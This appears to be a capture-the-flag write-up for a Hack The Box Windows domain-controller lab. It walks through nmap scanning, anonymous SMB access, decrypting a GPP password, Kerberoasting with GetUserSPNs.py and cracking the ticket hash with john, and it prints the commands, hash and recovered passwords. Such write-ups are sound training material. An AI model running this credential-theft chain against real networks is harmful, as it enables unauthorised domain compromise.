```shell
# Nmap 7.94SVN scan initiated Mon Sep  2 04:10:34 2024 as: nmap -sC -sV -oA nmap/active --min-rate=1000 -T5 -p- 10.129.224.153
Nmap scan report for 10.129.224.153
Host is up (0.076s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-02 09:11:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-02T09:12:20
|_  start_date: 2024-09-02T08:40:36
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

```

> too many services running, I focused on the basic ones **smb** 
> I first added active.htb on /etc/hosts files then I enumerated the smb service using `smbclient -L`

`smbclient -L active.htb`

```shell
Password for [WORKGROUP\ch10ro]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      

```


> replication share allows anonymous login, found an xml file that contains GPP user credentials
> named Group.xml
> 

```shell
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

> used gpp-decrypt to decrypt cpassword

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

> output: GPPstillStandingStrong2k18

> I used the credentials to access Users share, got the user flag

> Then I used the credentials to check for accounts vulnerable to Kerberoasting using **GetUserSPNs.py**  [reference](https://tools.thehacker.recipes/impacket/examples/getuserspns.py)

```shell
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.224.153
```

> found Administrator account and it's password hash, 

```shell
GetUserSPNs.py -outputfile kbr.txt -dc-ip 10.129.224.153 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1110b0cf5394e95820d1aca60e0fbcd5$f6d6647f74484391693e4c8097c1c696d3ffadfaa8a60a932f2bd3c80ae6a5358ade507258f7f5dbacf2d08a518e7f130373ac14c7189f6b8d09c33509494fa088bbf74b9ec9be8fd1eeae235ecfd948993c0736c1922988ae62d60e4d5daec446e35bb258b0fd628525cd3c982499614bbe7f4c673584b82e1ebb4102737344db7ab9d2b36385cb9cf9e4a350177a49df959289e9185bf7bf4fc385f409ec0ca6b57e21112dafdc48014c1f8ca0e0520ff8586d3b4e95ec6daca7f77b7cb3c524e1ebdf5279088ff96f85d738cd729b8edcfa3fe7c872e238a4cf648c69cc0a8b6a28675b5fca89c5a9f3299d0b72d3731a648ab0a77ca1133e96ada0fde534170afbc1f2b1514a4594bf5220bf0528d49cc22c11ed3a4621a772257275e896a0e0027ebb66b2f36f632cb1594437bc21c10236910c18c17b8e0ce64c3fad9ee5b8846304fcea3bf14bf3a2076c8afb7fa698915fe29686a4dbd8c031c0f14760e9064cc770cea218780812a2303d6eb69007fa85c53098fa9878ebe979e983929e1b997836804e7ddbfc603098b46c018f883f03d04e79d5b6c8f62db2bfbb40f7d7e4765bf4ab8ea7360a4d35a3741436072b2b5eef28d1b4c93efc10fb4cdd7160a88b5e3440a031bd352c8fcb9d2c327c9bfe599fd955ed3614c66dfbec022a3b7c619c708550fdca5b1916ea83fba316eebee9e69e4a8c8e7a929140b28551ca79e07b21cf03dfdef0a830cfb0b76e622597030dec722024e5f63a27b0348493e72cb138ad13455f80c42469e4e4446947923266263348c064636314c2bc8940213e255714b63eeb680a90edd96844e02d61adfea20b36e6c00ec28263d1af22e79ba975c63ebe4a5001e9d2c3357701bdffe6b008c238861e50621a97295ce0d5c8c12159f10019ad9b7a2c3500a6089c52680f074fbb718b28e4f64e18173eab0a1ef8a27bd23c7615d4f2b8e0044f473ff191b2f3561075bab3984572e08d1edbaa3b1595ed21e2949928a161032d064c583cc41e4a69a3c80b5875e1fa9486b869e6ae1950265cf73b11a27020f223bbaea4af16c0a26f7d108a6b599c00cfb195e285465e0d9e798d576248e407ffa763fabf342dd005b15b23d1e9e6927d34a8c9f57838e2ba48fca18e116dec5d6e29b6c0e3ab9fcd5996473d79090f8cb1840840ddc05bc239ec69361074d645f22a38ed1a1b88cced94ba482394d85e5451ea3f2914a95a401b5df0c0041288919ed287e435
```

> Used john the ripper to crack the password

`john kbr.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs`


> output: Ticketmaster1968

> Used the credentials Administrator:Ticketmaster1968 on the Users share to get root flag

```shell
smbclient //active.htb/Users -U Administrator
```

